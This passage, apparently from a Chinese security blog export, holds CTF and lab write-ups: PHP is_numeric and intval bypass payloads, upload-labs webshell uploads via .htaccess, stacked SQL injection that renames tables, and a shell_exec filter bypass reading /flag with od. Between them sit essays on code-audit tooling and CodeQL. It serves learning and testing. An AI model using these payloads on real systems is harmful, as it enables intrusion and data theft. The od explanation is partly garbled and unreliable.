//要相等if(is_palindrome_number($req[&quot;number&quot;]))//回文判断\n\n好了好了，关键过滤点我们都知道了。\n首先我们需要输入一个参数number,这number不能是数字或者数字字符串，但是又得是整数，他是回文数，又不能是回文数。阿哲。\n\n很离谱，我们想想绕过吧\n首先最简单的is_number()函数的绕过可以利用空字符截断%00\nis_numeric函数对于空字符%00判断为非数值，绕过第一个条件。函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符%20和空字符%00。\n\n可以看到是可以绕过的\n还有回文\n这里附上p神文章https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html#phpfuzz\n这里p神教了我们三种方法\nintval系统限制简单来说就是intval把变量转换为整数但他有极限，32位下-2147483648到 2147483647。\n64下\n最大为9223372036854775807。也就是说，当我们输入92233720368547758070这种大于极限的数字，就是会返回\n9223372036854775807也就是他的极限。\n\n那结合之前的绕过我们的payload就有了，思路就是输入一个本身和回文都大于极限的数，他们就相等了\n总结一下\n$req[‘number’]!&#x3D;strval(intval($req[‘number’]))这里是我们做文章要绕过的点，用我们的payload需要让这个成立，所以必须用09223372036854775807，为什么自己去理解\nfunction is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125; \n\n这个函数一个字符一个字符比较，我们不去管\n最终payload\nhttp://localhost/php_bugs-master/02.php/?number=%0009223372036854775807\n\n\nhttp://localhost/php_bugs-master/02.php/?number=%001000000000000000.00000000000000010\n还有其他的一些东西可以看p神\n03 多重加密","categories":["代码审计"],"tags":["代码审计","PHP"]},{"title":"upload_labs","url":"/2023/05/27/upload-labs/","content":"Pass-01前端检测，f12+f1禁用javascript\nPass-02无过滤后端MIME检测\n直接用bp修改MIME就行\n\n源码分析$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;\n\n$_FILES[&#39;upload_file&#39;]表示上传的文件信息，而[&#39;type&#39;]则表示该上传文件的MIME类型。\n用于检测，MIME\n$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];\n\n这句话是将临时文件名保存\n$img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]    \n\n获得文件路径\n路径和临时文件名都存在的话，就可以上传成功\n分析完其实就是一个MIME检测，这里只是了解一下常规的php代码是怎么写的\n这里就是检测路径和文件名存在\nPass-03黑名单问题，没有过滤完全\n$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;\n\n有一个需要注意的点就是这里需要环境配置，服务器\nAddType text/html .php .phtml .php5 .php3\n\n这里得自己增加开启，说白了这里其实很好防护\nPass_04本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！\n\n就是一个完全体的后缀过滤\n利用.htaccess文件\n.htaccess基础知识*重点内容*.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。它里面有这样一段代码：AllowOverride None，如果我们把None改成All\n\n.htaccess——超文本入口\n笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。\n\n所以我们可以尝试使用 这个 超文本入口 来达到这个目的\n.htaccess 文件内容：\n&lt;FilesMatch “shell.jpg”&gt;                      &#x2F;&#x2F;如果匹配到名为 shell.jpg 的文件 就执行该文件       SetHandler  application&#x2F;x-httpd-php             &#x2F;&#x2F;把文件当成php的代码来解析       \n1\n2\n3\n\n现在我们将该文件上传\n然后使用 蚁剑 进行链接\n然后我们发现链接失败 发现是 phpstudy集成环境中 php 的问题\n因为在 小皮面板中 php 版本 是nts 意思是即非线程安全，不提供数据访问保护 不支持使用 .htaccess \n","categories":["upload_labs"],"tags":["文件上传"]},{"title":"代码审计漫谈","url":"/2023/05/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%AB%E8%B0%88/","content":"前言因为自己想做一个代码审计工具，自己之前是有做过一点点代码审计的。审计过熊海，bluecms等等简单的一些cms。但是对其中的很多深层次原理都不了解。甚至可以说一点点都不懂，毕竟从用一个工具到做一个工具就是有本质上的区别。\n于我而言，做一个工具肯定是有很大的提升的。对于这个工具的构想，其实目标很简单，是想做出一款可以有多语言的，简洁的，几乎没有误报和漏报的一款简洁的代码审计工具(注意是几乎)。当然这个是很困难的QAQ。\n然后在写了一版申报书之后，发现自己想的太多了。这样一个大的项目以我本科生的水平几乎就是不可能完成的。所以呀，饭还是得一口一口吃。\n\n根据老师的一些建议，现在想的是如何从一个小的点上有所突破，做一个小而精的工具。我想这是我可以做到的\n一些概念其实一个好用的工具，最简单的标准就是自动化。不要当每一个人都是技术大牛，就算是技术大牛，有简单的工具我相信也没有人会去用复杂的工具\n所以自动化一定是最基础的要求点\n那怎么做到自动化，要有两个词的概念理解\n1.漏报率没有发现的bug\n2.误报率发现了错误的bug\n自动化代码审计工具正常来说都是我们给他一段代码，他给我们审计结果。这个结果中，里面这两个点就是绕不过的点。其实我之前的想法，什么深度学习，什么语法规则等等巴拉巴拉的东西，都是想为这两个点去服务。\n我们从深层原理去看看，为什么会出现这两个问题，也就是市面上的软件为什么也一直解决不了这个问题\n我们简单的把代码审计工具分为两类一类是动态的代码审计工具，一类是静态的代码审计工具\n动态代码审计工具这种工具基于代码运行的过程中处理挖掘漏洞一般称为IAST（interactive Application Security Testing）\n里面一般包含两个技术点\n1.hook在软件开发中，Hook是指在程序运行时，通过修改函数调用表（或者函数指针）的方法，使得程序在执行特定函数时，会先执行Hook函数，从而可以监控、修改或者替换原有函数的行为。在安全领域，攻击者可以使用Hook技术，将恶意代码注入到受攻击程序的运行过程中，从而获取敏感信息或者控制程序行为。\n2.前端爬虫在前端爬虫中，爬虫程序会模拟浏览器行为，对目标网站进行访问，并收集需要的数据。恶意攻击者可以使用Hook技术，监控网页中的某些函数调用。\n这里附上一张流程图\n\n我们通过前端爬虫模仿浏览器访问，同时使用hook，修改程序的执行流，如果如果Hook函数被触发，并满足某种条件，那么我们认为该漏洞存在。\n这类扫描工具的优势在于，通过这类工具发现的漏洞误报率比较低，且不依赖代码，一般来说，只要策略足够完善，能够触发到相应恶意函数的操作都会相应的满足某种恶意操作。而且可以跟踪动态调用也是这种方法最主要的优势之一。\n但是也有缺点\n(1) 前端Fuzz爬虫可以保证对正常功能的覆盖率，却很难保证对代码功能的覆盖率。如果曾使用动态代码审计工具对大量的代码扫描，不难发现，这类工具针对漏洞的扫描结果并不会比纯黑盒的漏洞扫描工具有什么优势，其中最大的问题主要集中在功能的覆盖度上。\n一般来说一个项目的代码是会有冗余的。也有很多开发人员也没想到的东西。有太多的代码不会从功能处发现，这样的检测就会有很高漏报率。\n(2) 动态代码审计对底层以及hook策略依赖较强，这里有很多问题。比如我们如果想要依赖IAST来做代码审计工具，我们的核心点就是要设计很多很多的hook方案，但是如果hook的深度不够，我们也不能执行我们的恶意代码，不能判断这里有漏洞。（漏报）还有也不是触发了恶意函数就可以判断有漏洞，比如有一个echo可以执行，不能直接判断为xss。同时由于需要运行，环境，执行效率等等都是很大很大的问题，这样也只能审计单一语言。多语言几乎是海量的工作量，所以现在的代码审计工具基本已经很少完全使用IAST了\n静态代码审计工具静态代码审计主要是通过分析目标代码，通过纯静态的手段进行分析处理，并挖掘相应的漏洞&#x2F;Bug.\n其实就是简单的人工读代码变成了机器读代码\n最基础的东西，也是最早或者说是最容易想到的方法\n正则匹配\n\n虽然我们匹配到了这个简单的漏洞，但是很快发现，事情并没有那么简单。\n\n但是这样永远没有尽头，你说用正则过滤过滤输入还是有用的，但是我们要去匹配代码，不可能完全覆盖，你永远不知道一些牛鬼蛇神怎么写代码\n于是有两种思路\n1.高覆盖性这类工具最经典的就是Seay，通过简单的关键字来匹配经可能多的目标，之后使用者可以通过人工审计的方式进一步确认。\n\\beval\\b\\(\n\n2.高可用性这类工具最经典的是Rips免费版\n\\beval\\b\\(\\$_(GET|POST)\n\n用更多的正则来约束，用更多的规则来覆盖多种情况。这也是早期静态自动化代码审计工具普遍的实现方法。\n但问题显而易见，高覆盖性和高可用性是这种实现方法永远无法解决的硬伤，不但维护成本巨大，而且误报率和漏报率也是居高不下。所以被时代所淘汰也是历史的必然。\n但是现在seay和rips依旧是主流软件，有人可能会问为什么，因为要其他钱啊！（开玩笑）\n再牛逼一点点AST!!!\nAST（Abstract Syntax Tree，抽象语法树）是一种用于表示程序源代码语法结构的树状数据结构。在编译器、解释器等程序分析工具中，AST通常是从源代码中生成的一种中间表示形式，用于对程序进行分析、优化、转换等操作。\nAST通常由一系列节点组成，每个节点表示源代码中的一个语法结构，例如函数、变量声明、表达式、控制流语句等。节点之间通过父子关系组织成一棵树，每个节点包含了语法结构的信息，例如标识符、运算符、字面量等。\nAST可以被用于各种程序分析和转换任务中，例如语法检查、编译优化、代码重构、程序理解和分析等。在编译器中，AST通常是编译过程中的一个重要中间表示形式，被用于生成目标代码。在静态分析工具中，AST可以被用于检查和修复代码中的各种问题，例如潜在的安全漏洞、性能瓶颈、代码风格问题等。\nAST在许多编程语言的编译器和解释器中都得到了广泛的应用，以下是一些使用AST的编程语言：\n\nC&#x2F;C++：GCC、Clang等编译器使用AST作为中间表示形式，用于编译、优化和代码生成。\nJava：Java编译器使用AST作为中间表示形式，用于语法检查、编译优化和代码生成。\nPython：Python解释器和静态分析工具使用AST进行代码检查、代码重构和性能优化。\nJavaScript：JavaScript解释器和编译器使用AST进行代码分析、优化和转换。\nRuby：Ruby解释器和编译器使用AST进行代码分析、优化和转换。\nGo：Go编译器使用AST作为中间表示形式，用于编译、优化和代码生成。\n\n除此之外，许多其他编程语言的编译器和解释器也采用了AST作为中间表示形式，以便于对程序进行分析和优化。\n看完这个概念大家有没有什么想法？再直观一点\n以php为例\n\n没错，我们只需要在AST上做文章，有了统一的AST语法树，上面的问题迎刃而解\n现在如何对AST语法树做分析也就成了我们这个工具最大的问题\n在理解如何分析AST语法树之前，我们首先要明白information flow、source、sink三个概念，\n\nsource： 我们可以简单的称之为输入，也就是information flow的起点\nsink： 我们可以称之为输出，也就是information flow的终点\n\n而information flow，则是指数据在source到sink之间流动的过程。\n也就是信息流分析\n把这个概念放在PHP代码审计过程中，Source就是指用户可控的输入，比如$_GET、$_POST等，而Sink就是指我们要找到的敏感函数，比如echo、eval，如果某一个Source到Sink存在一个完整的流，那么我们就可以认为存在一个可控的漏洞，这也就是基于information flow的代码审计原理。\n举个例子：\n\n\n这么一段代码生成的AST是什么捏\n\n也很简单\n在上面的分析过程中，Sink就是eval函数，source就是$_GET，通过逆向分析Sink的来源，我们成功找到了一条流向Sink的information flow，也就成功发现了这个漏洞。\n\n在分析information flow中明确作用域是基础中的基础\n如果我们只关注左值和右值的回溯\n\n我们会得到这样的结果\n但是这里有个get函数\n\n这样才是正确的流程\n所以我们的分析过程中作用域很重要\n在这段代码中，从主语法树的作用域跟到Get函数的作用域，如何控制这个作用域的变动，就是基于AST语法树分析的一大难点，当我们在代码中不可避免的使用递归来控制作用域时，在多层递归中的统一标准也就成了分析的基础核心问题。\n可是！\n\n还是有问题\n\n这样一段代码\n我们怎么分析\n应该说机器怎么分析\n逆向分析可以解决这个代码\n\n看到这里的分析，我们新建了一个规则作用于一个作用域。越来越复杂了。\n可能到现在你觉得我讲的有点懵、\n就是我们需要发现危险函数，但是AST的作用域就是程序的作用域，我们一但跳出一个函数就要建立新的规则，也就是说，每来一个作用域，我们都要新建立规则\n很复杂了吧，但是可以解决\n但是来个简单的\n\n这几乎是一个没有漏洞的代码，因为被过滤了\n但是AST不行\n这是一个典型的全局过滤，人工审计可以很容易看出这里被过滤了。但是如果在自动化分析过程中，当回溯到Source为$_GET[&#39;a&#39;]时，已经满足了从Source到sink的information flow。已经被识别为漏洞。一个典型的误报就出现了。\n而基于AST的自动化代码审计工具也正是在与这样的问题做博弈，从PHP自动化代码审计中比较知名的Rips、Cobra\n都是在不同的方式方法上，优化information flow分析的结果，而最大的区别则是离不开的高可用性、高覆盖性两点核心\n对于基于AST的代码分析来说，最大的挑战在于没人能保证自己完美的处理所有的AST结构，再加上基于单向流的分析方式，无法应对100%的场景，这也正是这类工具面临的问题（或者说，这也就是为什么选择逆向的原因）。\n所以呀，逆向很重要\nemmmm看来到目前也没有很好的解决方法\n还有基于IR&#x2F;CFG的分析AST是一个中间树，还有别的吗，答案是肯定的\nAST是编译原理中IR&#x2F;CFG的更上层\n也就是说，分析AST更接近分析代码，换句话就是说基于AST的分析得到的流，更接近脑子里对代码执行里的流程，忽略了大多数的分支、跳转、循环这类影响执行过程顺序的条件，这也是基于AST的代码分析的普遍解决方案，当然，从结果论上很难辨别忽略带来的后果。所以基于IR&#x2F;CFG这类带有控制流的解决方案，是现在更主流的代码分析方案，但不是唯一。\n什么是IR&#x2F;CFGIR（Intermediate Representation，中间表示）是一种高级语言和机器语言之间的抽象表示形式，通常是一种低级别的、机器无关的表示形式。IR可以作为编译器的一个重要中间表示形式，用于在源代码和目标代码之间进行转换和优化。IR通常是一种树状结构，包含了程序的控制流、数据流和操作等信息。\nCFG（Control Flow Graph，控制流图）是一种用于表示程序控制流的图形表示形式。CFG通过将程序的各个基本块（basic block）抽象为节点，将基本块之间的控制流关系抽象为有向边，从而形成一个图形结构。CFG可以用于描述程序的控制流结构，帮助程序员理解程序的执行过程，并在编译器中用于代码优化和转换。\n一般来说，我们需要遍历IR来生成CFG，其中需要按照一定的规则.当然，也可以用AST来生成CFG，毕竟AST是比较高的层级。\n而基于CFG的代码分析思路优势在于，对于一份代码来说，你首先有了一份控制流图（或者说是执行顺序），然后才到漏洞挖掘这一步。比起基于AST的代码分析来说，你只需要专注于从Source到Sink的过程即可。\n挑战的核心仍然维持在如何控制流，维持作用域，处理程序逻辑的分支过程，确认Source与Sink。\n理所当然的是，既然存在基于AST的代码分析，又存在基于CFG的代码分析，自然也存在其他的种类。比如现在市场上主流的fortify，Checkmarx，Coverity包括最新的Rips都使用了自己构造的语言的某一个中间部分，比如fortify和Coverity就需要对源码编译的某一个中间语言进行分析。前段时间被阿里收购的源伞甚至实现了多种语言生成统一的IR，这样一来对于新语言的扫描支持难度就变得大大减少了。\n新东西QLAST,CFG等其实本质上还是对于数据流的分析\n而QL就是把这个流的每一个环节具象化，把每个节点的操作具像成状态的变化，并且储存到数据库中。这样一来，通过构造QL语言，我们就能找到满足条件的节点，并构造成流。下面我举一个简单的例子来说：\n&lt;?php$a = $_GET[&#x27;a&#x27;];$b = htmlspecialchars($a);echo $b;\n\n我们简单的把前面的流写成一个表达式\necho =&gt; $_GET.is_filterxss\n\n这里is_filterxss被认为是输入$_GET的一个标记，在分析这类漏洞的时候，我们就可以直接用QL表达\nselect * where &#123;    Source : $_GET,    Sink : echo,    is_filterxss : False,&#125;\n\n我们就可以找到这个漏洞（上面的代码仅为伪代码），从这样的一个例子我们不难发现，QL其实更接近一个概念，他鼓励将信息流具象化，这样我们就可以用更通用的方式去写规则筛选。\n也就是更加的简单和方便\n也正是建立在这个基础上，CodeQL诞生了，它更像是一个基础平台，让你不需要在操心底层逻辑，使用AST还是CFG又或是某种平台，你可以将自动化代码分析简化约束为我们需要用怎么样的规则来找到满足某个漏洞的特征。这个概念也正是现代代码分析主流的实现思路，也就是将需求转嫁到更上层。\n参考文献：https://paper.seebug.org/1339/#_1\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"关于codeql的一些思考和学习","url":"/2023/05/06/%E5%85%B3%E4%BA%8Ecodeql%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83%E5%92%8C%E5%AD%A6%E4%B9%A0/","content":"前言想做一个代码审计的工具，查了查网上的资料，发现前沿一点的是一个叫codeql的一个技术，是一种数据库的东西，而且好像还是开源的。于是想来学习一下\ncodeql工作流程\n(图片来源：https://blog.semmle.com/introduction-to-variant-analysis-part-2/)\ncodeql整体思路是把我们想要审计的代码转换为一个可查询的数据库，有点神奇了起来。\n\n通过 Extractor 模块对源代码工程进行关键信息分析提取，构成一个关系型数据库。\ncodeql是自己搞得关系型数据库\n转换成数据库，得思考他转换成什么？\n这里对于不同的类型的语言他有不同的处理方式\n编译型Extrator模块监控编译过程，收集源码相关信息，得到其中的:AST,语义信息，控制流数据流等等，同时复制一份源码文件\n解释型Extrator模块直接分析源码\n这里我注意到EXtrator模块很牛哈\n我chatgpt一手\nCodeQL 中的 Extractor 模块是用于将源代码转换为 CodeQL 数据库的工具。它的主要工作原理是将源代码解析为抽象语法树（AST），然后使用 CodeQL 中预定义的语言规范将 AST 转换为具有关系的数据库模型。Extractor 可以识别多种编程语言中的代码，包括 C，C++，Java，Python，Go 等等。\nExtractor 还支持自定义解析器和外部语言规范，以便支持其他编程语言或特定的代码风格。例如，如果你的代码使用了一些非标准的语言特性或自定义的库，你可以通过定义自己的解析器和语言规范来使 Extractor 能够解析你的代码。\n总之，Extractor 模块的工作原理是将源代码转换为 CodeQL 数据库，它是 CodeQL 分析过程的第一步，为后续的分析提供了一个可查询的数据模型。\n牛的\n做完分析所有的数据会导入到CodeQL database这个文件夹，其中包括了源代码文件、关系数据、语言相关的 database schema（schema 定义了数据之间的相互关系）。\ncodeql自定义了一套名为QL的查询语言并提供了相应的支持库和运行环境。最终将查询结果返回给用户，方便用户进一步的审计\n项目构成codeql-cli-binaries 工程是 CodeQL 的命令行工具，实现了 CodeQL 的大部分核心功能，包括 Extractor（不同目标语言对应着不同的 Extractor）、中间语言转换、AST 提取、控制流分析、数据流分析等，这个工程的核心模块都只提供 binary，并不开放源代码。\nql 工程是 QL 查询语言的实现，QL 是一种面向对象的高级语言，其支持库中封装了程序分析所需的所有对象及常用方法。\n另外还有两个不太重要工程：\nvscode-codeql:https://github.com/github/vscode-codeql\nvscode-codeql-starter：https://github.com/github/vscode-codeql-starter\nvscode-codeql 是 CodeQL 的 VS Code 插件，它主要是为了方便在 VS Code 做结果展示用的; vscode-codeql-starter 工程是配合 VS Code 使用的一个 Workspace，它主要是为了方便配置，用户也完全可以自己配置 Workspace。\n这里配上他人的总结\n\nCodeQL 的这些能力是它独有的吗？当然不是。白盒代码审计并不是新的领域，业界已经有非常多的工具。老牌商业软件如 Fortify SCA, Coverity，开源工具更多，各大互联网公司也都会建设自己的源代码安全审计平台，这里就不一一列举了。以 Fortify 为例， 其产品白皮书中就说明了它的五大主要分析引擎：数据流、语义、结构、控制流、配置流。各家也都在做，学术界研究的也不少。\nCodeQL 有什么优势？简单说就是免费、开源、Semmle 团队强大的研究能力。Semmle 孵化于牛津大学, 其投资者包括 Google, Microsoft, NASA 等，现在又加入了 Github，这样闪光的履历其实也是能力的背书。具体讲，CodeQL 的基础功能扎实，迭代迅速，又不断有研究员发高水平的文章，这些都是它的优势。\nCodeQL 能给白盒领域带来突破性的发展吗？这个不一定。从本文的漏洞实例分析中你也可以看出，白盒审计最重要的能力是对安全模型的认识和对分析目标的理解。傻瓜一键式的工具是不存在的，或者换种说法，简单问题现有工具就能解决了。所以核心还是人。\nCodeQL 对我们有什么价值？分两方面。对个人而言，意味者被赋能了更复杂的代码分析能力。越是困难的问题，基础工具的能力越是重要，这在各个领域都是相通的。比如在二进制软件分析领域，近年来在 Intel PT 技术等基础能力的加持下，就有了非常迅速的发展。对企业而言，目前互联网公司的白盒代码审计多是采用采购商业软件 + 自研工具的方式，那我认为 CodeQL 当然是一个很重要的技术选型目标。\nCodeQL 更适用于哪些场景？更适用于对复杂安全问题的建模。Fortify 之类的老牌商业软件更重要的是它的规则库，更适合做大规模、通用型问题的扫描。CodeQL 当然也可以这样用，但我认为它更适合的场景是做复杂安全问题的建模，在对审计目标有足够理解的基础之上做针对性的安全分析。\n\n于我而言，codeql的核心技术不开源没有源码还是我很难受的一个点，笔者现在也在思考是否做一个只能基于他的binary的工具，其实还是不愿意的。\n参考文章：https://lennysec.github.io/codql-and-cve-2019-3560/\n","categories":["代码审计"],"tags":["代码审计","codeql"]},{"title":"应用安全测试技术","url":"/2023/08/07/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF/","content":"应用安全测试技术ASTAST（Application Security  Test，应用安全测试）,这个就是概念，很好理解，目前来说我知道的AST技术有三类,SAST,DAST,IAST\nSASTstatic，就是纯纯的白盒审计，意味着不用运行\n优点容易做，检出率高，定位到代码行\n缺点准确性差，看不到执行流，慢\nDAST纯纯黑盒测试，不访问代码和细节，扫描器就是\n优点无需代码\n执行快\n误报低\n缺点检出率低\n无法定位到代码行\n使用门槛高\nIAST结合了DAST和SAST\n既可以看到源代码，又可以看到应用程序的执行流\n优点检出率高，误报率低，实时产生结果\n","categories":["工作"],"tags":["work"]},{"title":"强网杯--nss","url":"/2023/05/21/%E5%BC%BA%E7%BD%91%E6%9D%AF-nss/","content":"[强网杯 2019]随便注很经典的一道题，利用这题复习复习堆叠注入\n还是前期测试\n\n用单引号闭合是这样的，如果注释一下\n\n回显正常，所以可以判断是单引号\n然后一直正常判断\n1’ union select 1,2#\n\n返回了黑名单\n看看过滤我们选择使用堆叠注入，堆叠注入就是使用多条语句一起执行\n1&#x27;;show databases;#1&#x27;;show tables;#0&#x27;;show columns from `1919810931114514`;#0&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#0&#x27; or &#x27;1&#x27;=&#x27;1https://www.freebuf.com/articles/web/250705.html\n\n[广东强网杯 2021 团队组]love_Pokemon &lt;?phperror_reporting(0);highlight_file(__FILE__);$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;function DefenderBonus($Pokemon)&#123;    if(preg_match(&quot;/&#x27;| |_|\\\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\\\\\|p|h|u|v|\\\\+|\\\\^|\\`|\\~|\\||\\&quot;|\\&lt;|\\&gt;|\\=|&#123;|&#125;|\\!|\\&amp;|\\*|\\?|\\(|\\)/i&quot;,$Pokemon))&#123;        die(&#x27;catch broken Pokemon! mew-_-two&#x27;);    &#125;    else&#123;        return $Pokemon;    &#125;&#125;function ghostpokemon($Pokemon)&#123;    if(is_array($Pokemon))&#123;        foreach ($Pokemon as $key =&gt; $pks) &#123;            $Pokemon[$key] = DefenderBonus($pks);        &#125;    &#125;    else&#123;        $Pokemon = DefenderBonus($Pokemon);    &#125;&#125;switch($_POST[&#x27;myfavorite&#x27;] ?? &quot;&quot;)&#123;    case &#x27;picacu!&#x27;:        echo md5(&#x27;picacu!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);        break;    case &#x27;bulbasaur!&#x27;:        echo md5(&#x27;miaowa!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);        $level = $_POST[&quot;levelup&quot;] ?? &quot;&quot;;    if ((!preg_match(&#x27;/lv100/i&#x27;,$level)) &amp;&amp; (preg_match(&#x27;/lv100/i&#x27;,escapeshellarg($level))))&#123;            echo file_get_contents(&#x27;./hint.php&#x27;);        &#125;        break;    case &#x27;squirtle&#x27;:        echo md5(&#x27;jienijieni!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);        break;    case &#x27;mewtwo&#x27;:        $dream = $_POST[&quot;dream&quot;] ?? &quot;&quot;;        if(strlen($dream)&gt;=20)&#123;            die(&quot;So Big Pokenmon!&quot;);        &#125;        ghostpokemon($dream);        echo shell_exec($dream);&#125;?&gt; \n\n代码审计\n最近有点浮躁，这个现在开始慢慢写题，一定要吃透\n这里有一个escapeshellarg函数，用p神文章学习\nhttps://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html\nhttps://blog.csdn.net/qq_43085611/article/details/119523915\nescapeshellarg 利用的关键点：\n\n参数注入：当开发人员错误的使用，可能导致代码执行。\n代码执行：去掉字符串中的不可见字符。\n\nif ((!preg_match(&#x27;/lv100/i&#x27;,$level)) &amp;&amp; (preg_match(&#x27;/lv100/i&#x27;,escapeshellarg($level))))&#123;            echo file_get_contents(&#x27;./hint.php&#x27;);        &#125;\n\n这里有一个利用的条件，没有lv100，但是经过escapeshellarg处理，得有lv100，\n这个函数的作用有去掉字符串中的不可见字符\n好的输入一个\nlv%FF100\nhint\n\n\n然后就是命令执行\n因为我们常见的命令执行都已经被过滤了\n“od” 是 Unix &#x2F; Linux 操作系统中的一个命令，用于将文件或输入流中的数据转换为八进制、十六进制或其他格式的可打印 ASCII 字符表示。它通常用于查看二进制文件的内容、比较不同版本的文件，或者将二进制数据转换为可读的字符。\n“od” 命令可以接受多种参数和选项，以便将数据转换为不同的格式。例如，使用 “-c” 选项可以将数据转换为可打印的 ASCII 字符表示，而使用 “-x” 选项可以将数据转换为十六进制格式。\n下面是一个使用 “od” 命令将文件内容转换为八进制格式的示例：\nod -b /path/to/file\n\n在这个示例中，我们使用 “od” 命令将 “&#x2F;path&#x2F;to&#x2F;file” 文件的内容转换为八进制格式，并在命令行终端中输出结果。输出结果类似于下面这样：\napache\n0000000 211 114 105 116 101  040 104 79  114  102  041 其中，每一行表示文件的一部分内容，第一列是该部分内容在文件中的偏移量（以八进制格式表示），后面的列是该部分内容的八进制表示。在这个示例中，第一行的八进制表示为 &quot;211 114 105 116 101 040 104 79 114 102 041&quot;，对应的 ASCII 字符为 &quot;# Linux ELF&quot;。在本例中，攻击者可以使用 &quot;od&quot; 命令来执行任意命令，因为黑名单过滤器没有过滤掉 &quot;od&quot; 字符串。攻击者可以使用 &quot;-c&quot; 选项将文件内容转换为可打印 ASCII 字符表示，并将其输出到命令行终端中，从而执行任意命令。这种漏洞称为命令执行绕过漏洞，是一种常见的安全问题。\n\n这里传入的内容长度不能超过20个字符，然后经过一个黑名单过滤，最后会放入到shell_exec()执行。我们查看黑名单中的字符，发现od并没有过滤，使用od -c命令也能读取文件内容，example:\n# od -c /flag0000000   f   l   a   g   &#123;   s   u   c   c   e   s   s   !   &#125;  \\n0000017\n\n然后就是构造出 FLAG 